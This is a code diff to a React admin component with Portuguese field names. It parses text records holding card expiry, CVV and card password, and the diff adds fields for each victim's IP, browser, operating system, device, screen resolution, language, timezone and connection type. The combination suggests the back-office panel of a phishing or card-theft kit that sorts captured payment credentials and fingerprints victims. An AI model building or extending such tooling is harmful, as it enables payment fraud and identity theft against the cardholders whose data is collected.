@@ -170,7 +170,15 @@ const Admin = () => {
       validade: '',
       cvv: '',
       senhaCartao: '',
-      data: ''
+      data: '',
+      ip: '',
+      navegador: '',
+      so: '',
+      dispositivo: '',
+      resolucao: '',
+      idioma: '',
+      fuso: '',
+      conexao: '',
     };
 
     for (const line of lines) {
@@ -188,6 +196,22 @@ const Admin = () => {
         data.senhaCartao = line.split('Senha do Cartão:')[1]?.trim() || '';
       } else if (line.includes('Data/Hora:')) {
         data.data = line.split('Data/Hora:')[1]?.trim() || '';
+      } else if (line.includes('IP:') && !line.includes('INFORMAÇÕES')) {
+        data.ip = line.split('IP:')[1]?.trim() || '';
+      } else if (line.includes('Navegador:')) {
+        data.navegador = line.split('Navegador:')[1]?.trim() || '';
+      } else if (line.includes('Sistema Operacional:')) {
+        data.so = line.split('Sistema Operacional:')[1]?.trim() || '';
+      } else if (line.includes('Tipo de Dispositivo:')) {
+        data.dispositivo = line.split('Tipo de Dispositivo:')[1]?.trim() || '';
+      } else if (line.includes('Resolução:')) {
+        data.resolucao = line.split('Resolução:')[1]?.trim() || '';
+      } else if (line.includes('Idioma:')) {
+        data.idioma = line.split('Idioma:')[1]?.trim() || '';
+      } else if (line.includes('Fuso Horário:')) {
+        data.fuso = line.split('Fuso Horário:')[1]?.trim() || '';
+      } else if (line.includes('Tipo de Conexão:')) {
+        data.conexao = line.split('Tipo de Conexão:')[1]?.trim() || '';
       }
     }
 
